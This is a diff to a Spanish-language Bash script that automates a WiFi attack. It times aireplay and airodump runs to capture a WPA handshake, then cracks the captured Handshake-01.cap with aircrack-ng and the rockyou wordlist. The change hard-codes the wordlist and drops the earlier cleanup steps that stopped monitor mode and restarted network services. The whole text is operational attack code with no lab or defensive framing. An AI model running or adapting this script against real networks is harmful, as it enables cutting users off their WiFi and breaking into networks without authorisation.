@@ -70,19 +70,14 @@ if [ $airtest -eq 0 ]; then
 					aireplay_xterm_PID=$!
 					sleep 10; kill -9 $aireplay_xterm_PID; wait $aireplay_xterm_PID 2>/dev/null
 
-					sleep 10; kill -9 $airodump_filter_xterm_PID
+					sleep 15; kill -9 $airodump_filter_xterm_PID
 					wait $airodump_filter_xterm_PID 2>/dev/null
-
-					read -p "Ruta del diccionario al usar: " dicc
-					xterm -hold -e "aircrack-ng -w $dicc Handshake-01.cap" &
 					
-					echo -e "$blueColour"
-					echo -e "\nSe ha terminado el ataque a la red\n"
-					$cleancolor
-					sudo airmon-ng stop ${tar}mon > /dev/null 2>&1
-					sudo service NetworkManager start > /dev/null 2>&1
-					sudo service wpa_suppclicant start > /dev/null 2>&1
-					break
+					cd /usr/share/wordlists
+					sudo gunzip -d rockyou.txt.gz
+					
+					sleep 5; xterm -hold -e "aircrack-ng -w /usr/share/wordlists/rockyou.txt Handshake-01.cap" &
+					
 				fi
 			if [ "$rps" == "N" ] || [ "$rps" == "n" ]; then
 				echo -e "${redColour}\n[*] Saliendo"
